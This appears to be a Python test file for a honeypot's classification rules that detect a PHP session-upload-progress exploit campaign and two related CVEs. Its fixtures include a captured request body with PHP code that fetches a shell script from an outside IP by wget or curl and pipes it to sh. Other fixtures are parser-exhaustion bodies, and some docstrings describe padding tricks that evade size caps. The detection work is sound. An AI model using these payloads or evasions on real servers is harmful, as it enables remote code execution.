"""The PHP2Shell vector had no rule at all, so every decoy named it something else.

Measured on the fleet 2026-10-26 (internal PHP2Shell review §4): of 94 rows whose
payload or metadata mentions ``session.upload_progress``, **14** carried the right CVE and all
fourteen came from Suricata on one sensor; **20** carried ``NGINX_CVE_2026_42533`` because the
nginx decoy's own >16 KB overflow indicator was the only thing that fired; **13** carried a bare
``RCE,PHP``; and **35** carried nothing. ``sensor-b`` labelled none of its 31 events, because the
Suricata rule that produces the only correct label is absent from its ruleset.

Root cause: no rule in ``classification/`` mentioned ``PHP_SESSION_UPLOAD_PROGRESS``. Detection
lived in two per-host places — one Suricata rule on one sensor, and one decoy's private
signature set — and in no shared place at all.

The discriminator pinned here is the **form field name**, not a boundary or a user-agent.
The internal PHP2Shell IOC note §3 derives why from every capture on the fleet: the two
highest-volume actors randomise their multipart boundary per request, so no boundary constant
can ever catch them, and the progress field is the only stable token.
"""

from __future__ import annotations

import honeylens.classification.text_rules as tr
from honeylens.classification.scoring import ATTACK_TYPE_SEVERITY

# Real captured bodies, sensor-a, 2026-10-26.

# The exploitation variant: 42 events, actor 77.90.185.20, WebKitFormBoundary + 8 random chars.
EXPLOIT_BODY = (
    'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
    "CGbtUdBaZLPv21BEVDJmQudrjG4Sh-UM\r\n"
    'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    "<?php echo '__START__'; system('(wget --no-check-certificate -qO- "
    "https://217.60.102.5/sh || curl -sk https://217.60.102.5/sh) | sh -s php2shell'); "
    "echo '__END__';?>\r\n"
    'Content-Disposition: form-data; name="pad_0"\r\n\r\n'
    "hrEZdP7MNHPvPbW6s5IlPd1HDpJDoZSCkQCwSXyDj4tDubJBH\r\n"
)

# Scanner shape B: 4 events, actor 204.76.203.7, fixed FBBOUND boundary, no PHP code at all.
PROBE_BODY = (
    "--FBBOUND\r\n"
    'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    "probe\r\n"
    "--FBBOUND\r\n"
    'Content-Disposition: form-data; name="file"; filename="x|junkjunknotanobject"\r\n'
    "Content-Type: application/octet-stream\r\n\r\n\r\n"
    "--FBBOUND--\r\n"
)

# Self-identified census probe: 3 events, three addresses, body byte-identical across all three.
CENSUS_BODY = (
    'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    "internet-census\r\n"
    'Content-Disposition: form-data; name="file"; filename="internet-census.txt"\r\n\r\n1\r\n'
)


def _rules_for(attack_type: str) -> list[tuple[str, object]]:
    return [(name, pat) for (at, name, pat) in tr._RULES if at == attack_type]


def _fires(attack_type: str, text: str) -> bool:
    rules = _rules_for(attack_type)
    assert rules, f"no {attack_type} rule registered"
    return any(pat.search(text) for _name, pat in rules)


def test_the_exploitation_body_is_named_as_the_cve():
    """The 42 events from the busiest actor carried `RCE,PHP` or nothing — never the CVE."""
    assert _fires("CVE_2026_109619", EXPLOIT_BODY)
    assert _fires("PHP2SHELL", EXPLOIT_BODY)


def test_the_exploitation_verdict_matches_the_name_suricata_already_uses():
    """Suricata writes `EXPLOIT,CVE_2026_109619`. A decoy writing a different spelling of the
    same CVE would split one campaign across two hunts."""
    assert any(at == "CVE_2026_109619" for at, _n, _p in tr._RULES)


def test_a_probe_with_no_code_is_not_called_remote_code_execution():
    """Scanner shapes A and B carry the vector and no payload. Calling them RCE would put a
    port scan next to a working dropper in every count on the dashboard."""
    assert not _fires("CVE_2026_109619", PROBE_BODY)
    assert _fires("PHP2SHELL", PROBE_BODY)


def test_the_census_probe_is_the_vector_without_the_cve():
    assert _fires("PHP2SHELL", CENSUS_BODY)
    assert not _fires("CVE_2026_109619", CENSUS_BODY)


def test_padding_the_part_headers_cannot_talk_a_dropper_down_to_a_scan():
    """The first draft capped the distance between the field name and the PHP tag at 200
    characters and defined the weaker verdict as a negative lookahead over the same window.
    Padding the part headers past the cap therefore missed the CVE rule and *satisfied* the
    other one, scoring a working dropper as a scan — an attacker-controlled severity
    downgrade, which is worse than no match at all."""
    padded = EXPLOIT_BODY.replace(
        'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n',
        'name="PHP_SESSION_UPLOAD_PROGRESS"\r\nX-Pad: ' + "A" * 400 + "\r\n\r\n",
    )
    assert "A" * 400 in padded
    assert _fires("CVE_2026_109619", padded)


def test_every_php_open_tag_form_is_recognised():
    """`<?=` is on by default since PHP 5.4 and `<? ` wherever short_open_tag is set. Matching
    only `<?php` let either form through to the weaker verdict."""
    for tag in ("<?php echo 1;", "<?= system('id');", "<?\nsystem('id');"):
        body = 'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n' + tag
        assert _fires("CVE_2026_109619", body), tag


def test_an_unrecognised_payload_still_reports_the_vector():
    """The worst case for an evading dropper must be the vector tag alone — never a positive
    claim that what was seen was harmless."""
    odd = (
        'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        "\\u003C\\u003Fphp system('id');"
    )
    assert _fires("PHP2SHELL", odd)
    assert not _fires("CVE_2026_109619", odd)


def test_the_field_is_the_discriminator_not_the_boundary():
    """Internal PHP2Shell IOC note §3: the two highest-volume actors randomise the boundary per
    request (23/23 and 14/14 captures), so a boundary constant catches neither. A body with the
    progress field and an unseen random boundary must still fire."""
    unseen_boundary = EXPLOIT_BODY.replace("pad_0", "zz9")
    assert _fires("CVE_2026_109619", unseen_boundary)


def test_a_self_naming_tool_is_attributed_even_with_no_vector():
    """149.102.240.85 sends `shellflow-php2shell/1.0` on a bodyless GET — campaign tagging with
    no vector. 85.11.167.243 names the CVE in its UA."""
    assert _fires("PHP2SHELL", "GET / HTTP/1.1\r\nUser-Agent: shellflow-php2shell/1.0\r\n")
    assert _fires("PHP2SHELL", "User-Agent: php2shell-109618\r\n")


def test_an_ordinary_multipart_upload_fires_neither():
    benign = (
        "--X\r\n"
        'Content-Disposition: form-data; name="avatar"; filename="me.png"\r\n'
        "Content-Type: image/png\r\n\r\n\x89PNG\r\n--X--\r\n"
    )
    assert not _fires("CVE_2026_109619", benign)
    assert not _fires("PHP2SHELL", benign)


def test_php_code_without_the_vector_is_not_attributed_to_this_cve():
    """A generic PHP RCE attempt is already caught by the PHP/RCE rules. Attributing it to this
    CVE would inflate the campaign with unrelated traffic."""
    assert not _fires("CVE_2026_109619", "<?php system('id'); ?>")
    assert not _fires("PHP2SHELL", "<?php system('id'); ?>")


def test_the_severities_separate_a_dropper_from_a_scan():
    assert ATTACK_TYPE_SEVERITY["CVE_2026_109619"] == "critical"
    assert ATTACK_TYPE_SEVERITY["PHP2SHELL"] == "medium"


def test_padding_past_the_classification_cap_cannot_hide_the_payload():
    """Measured 2026-10-26: the classifier caps each target at CLASSIFY_BODY_BYTES (8192) and the
    campaign's real bodies are 22,619 bytes. The `payload` path already scans a head *and* a tail
    for exactly this reason — its own comment calls "send 8 KB of padding, then the exploit" a
    one-line evasion — but `body_sample` was capped to the head only.

    So a body with the progress field at 8,143 bytes and the PHP tag at 10,903 came back as the
    vector alone, at medium, for a request carrying a working dropper: the same
    attacker-controlled severity downgrade this file already pins at a smaller scale, reached by
    padding instead of by regex. The actors already send bodies 2.7x the cap.

    The first fix (head AND tail) was tested on a fixture of ~10,923 bytes, which fits head+tail
    entirely, while this docstring said the real bodies are 22,619: at that size the field was
    bisected by the head cut and the tag was outside the tail window, and the dropper scored as
    nothing at all. The fixture below is the real size, with both tokens in the blind middle.
    """
    from honeylens.classification.attack_classifier import (
        _BODY_CLASSIFY_BYTES as cap,
    )
    from honeylens.classification.attack_classifier import (
        classify_event_row,
    )

    token = "PHP_SESSION_UPLOAD_PROGRESS"
    field = f'Content-Disposition: form-data; name="{token}"\r\n\r\n'
    php = "<?php system('id');?>"

    def build(total: int, token_at: int, php_at: int) -> str:
        """A body of exactly `total` bytes with the field name starting at `token_at` and the PHP
        tag starting at `php_at`, padding everywhere else."""
        pad = ("Y: " + "A" * 64 + "\r\n") * (total // 68 + 2)
        start = token_at - field.index(token)
        body = pad[:start] + field
        body += pad[: php_at - len(body)] + php
        body += pad[: total - len(body)]
        assert len(body) == total and body.index(token) == token_at
        assert body.index("<?php") == php_at
        return body

    def verdicts(body: str) -> set[str]:
        md = {"path": "/index.php", "method": "POST", "body_sample": body, "body_len": len(body)}
        return {h[0] for h in classify_event_row("POST /index.php", "http", md)}

    # The campaign's measured real size, the field name bisected by the head cut (8,192) and
    # the PHP tag in the middle: the head holds half a token, the tail (from 14,427) neither.
    real = build(22_619, 8_170, 10_903)
    assert real.index(token) < cap < real.index(token) + len(token), "head cut bisects the field"
    assert len(real) - cap > real.index("<?php"), "the PHP tag is outside the tail window"
    assert {"PHP2SHELL", "CVE_2026_109619"} <= verdicts(real), (
        "a dropper at the campaign's real size must not score as nothing"
    )
    # Anywhere in a body as large as MAX_CAPTURE allows, not only at one measured offset.
    for total, at in ((30_000, 12_000), (65_536, 30_000), (65_536, 20_000)):
        found = verdicts(build(total, at, at + 3_000))
        assert {"PHP2SHELL", "CVE_2026_109619"} <= found, (total, at)
    # A probe in the middle is the vector alone, never the CVE: the whole-body path must not
    # make a scan look like a dropper.
    probe = verdicts(build(65_536, 30_000, 30_000 + 200).replace("<?php", "<!--x"))
    assert "PHP2SHELL" in probe and "CVE_2026_109619" not in probe


def test_the_whole_body_check_costs_linear_time_even_on_a_body_made_of_the_field():
    """The CVE rule's lookahead restarts a scan to the end of the text at every occurrence of the
    field, which is quadratic on a body that repeats it. The whole-body path must not inherit
    that: 64 KB of nothing but the field name, no PHP tag, has to stay cheap."""
    import time

    from honeylens.classification.attack_classifier import classify_event_row

    body = "PHP_SESSION_UPLOAD_PROGRESS " * (65_536 // 28)
    md = {"path": "/index.php", "method": "POST", "body_sample": body, "body_len": len(body)}
    start = time.perf_counter()
    found = {h[0] for h in classify_event_row("POST /index.php", "http", md)}
    assert time.perf_counter() - start < 5.0
    assert "PHP2SHELL" in found and "CVE_2026_109619" not in found


# ---------------------------------------------------------------------------------------------
# CVE-2026-109618 -- the half of the pair that had no verdict at all until 2026-10-30.
#
# Measured on sensor-a that day while reviewing this CVE by name: the identifier existed in
# `classification/` only inside comments, so every event of this shape was stored as a bare
# `PHP2SHELL` and the CVE could not be hunted for. Two real shapes, both from captured bodies.

# 94.154.43.7, ten bodies 1,786-422,970 bytes. The form field is a 240-deep nested array and the
# request carries no PHP tag anywhere, so the 109619 rule correctly declines it.
NESTED_BODY = (
    "------p2shell0bf9b7bacde0be79706d968a\r\n"
    'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
    "------p2shell0bf9b7bacde0be79706d968a\r\n"
    'Content-Disposition: form-data; name="f0'
    + "".join(f"[k{i}]" for i in range(240))
    + '"\r\n\r\nZ\r\n'
)


# 85.11.167.243, one 62,929-byte body padded with `A` under the user-agent `php2shell-109618`.
def _oversize_body(total: int = 62_929) -> str:
    head = (
        "--B7kQpoc618\r\n"
        'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\na1b2c3d4e5f6a7b8c9d0e1f2a3\r\n'
        "--B7kQpoc618\r\n"
        'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        "--B7kQpoc618\r\n"
        'Content-Disposition: form-data; name="f"; filename="a"\r\n\r\n'
    )
    return head + "A" * (total - len(head))


def _whole_body_verdicts(body: str) -> set[str]:
    from honeylens.classification.attack_classifier import classify_event_row

    md = {"path": "/index.php", "method": "POST", "body_sample": body, "body_len": len(body)}
    return {h[0] for h in classify_event_row("POST /index.php", "http", md)}


def test_the_nested_array_body_is_named_as_109618():
    """The nested-key form is the only one of the two tells that is a token, so it is the only
    one a regex can carry. Both paths must agree on it."""
    assert _fires("CVE_2026_109618", NESTED_BODY)
    assert _fires("PHP2SHELL", NESTED_BODY)
    assert {"PHP2SHELL", "CVE_2026_109618"} <= _whole_body_verdicts(NESTED_BODY)


def test_the_nested_array_body_is_not_called_code_execution():
    """It carries no PHP tag. Labelling it 109619 would put a parser crash next to a shell."""
    assert not _fires("CVE_2026_109619", NESTED_BODY)
    assert "CVE_2026_109619" not in _whole_body_verdicts(NESTED_BODY)


def test_the_oversize_body_is_named_as_109618_by_length_alone():
    """85.11.167.243's body has no nested keys and no code -- its only tell is its size, which
    is a length and not a token, so only the whole-body path can reach this verdict."""
    found = _whole_body_verdicts(_oversize_body())
    assert {"PHP2SHELL", "CVE_2026_109618"} <= found
    assert "CVE_2026_109619" not in found


def test_a_dropper_at_the_measured_size_is_not_also_called_exhaustion():
    """77.90.185.20's real dropper is 14,402 bytes. If the size threshold caught it too, every
    dropper would carry both verdicts and the two shapes could not be counted apart."""
    body = EXPLOIT_BODY + "x" * (14_402 - len(EXPLOIT_BODY))
    found = _whole_body_verdicts(body)
    assert "CVE_2026_109619" in found
    assert "CVE_2026_109618" not in found


def test_the_census_probe_is_not_called_exhaustion_either():
    """The 302-byte census probe must stay the vector alone under both CVEs."""
    found = _whole_body_verdicts(CENSUS_BODY)
    assert found & {"PHP2SHELL"}
    assert not found & {"CVE_2026_109618", "CVE_2026_109619"}


def test_both_cves_have_a_severity():
    """An attack_type with no entry in the severity map scores as unknown on the dashboard, so a
    new verdict that is never ranked is a verdict nobody sees."""
    assert ATTACK_TYPE_SEVERITY["CVE_2026_109618"] == "high"
    assert ATTACK_TYPE_SEVERITY["CVE_2026_109619"] == "critical"
